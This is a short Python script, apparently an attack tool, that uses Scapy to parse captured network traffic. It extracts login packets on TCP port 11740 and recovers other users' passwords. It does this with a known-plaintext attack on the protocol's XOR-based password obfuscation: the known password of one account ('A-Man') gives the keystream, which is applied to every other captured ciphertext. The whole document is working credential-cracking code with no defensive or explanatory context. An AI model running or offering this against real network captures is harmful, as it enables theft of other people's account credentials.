from scapy.all import *
import sys
packets = rdpcap(sys.argv[1])

def parse(data):
 username = data.split(b"\x00\x10")[1].split(b"\x00")[0][1:]
 username_len = data[data.index(username)-1]
 password_idx = data.index(username)+username_len+4
 password = data[password_idx:]
 return (username,password)

def xorbytes(ba1, ba2):
 return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def known_pt(pairs,known_username, known_password):
 master=-1
 for i in range(len(pairs)):
  if pairs[i][0]==known_username:
   master=i
   break
 if master==-1:
  print("Username not recovered!")
  return (None,None)
 master_ct = pairs[master][1]

 d0 = xorbytes(known_password,master_ct)
 recovered = []
 print("")
 print(d0.hex())
 print("")
 for i in range(len(pairs)):
  if(i==master):
   continue

  recovered.append( (pairs[i][0],xorbytes(d0,pairs[i][1])) )

 return recovered
pairs = []

for packet in packets:
 if packet.haslayer(TCP):
  if packet[TCP].dport==11740:
   if packet[TCP].haslayer(Raw):
    if bytes.fromhex("22 84 80 00 01") in packet[TCP][Raw].load:
     pairs.append(parse(packet[TCP][Raw].load))

for pair in pairs:
 print("Username: {}\nEncrypted Pass: {}".format(pair[0],pair[1].hex()))

recovered = known_pt(pairs,b"A-Man",b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

for i in recovered:
 print(i)


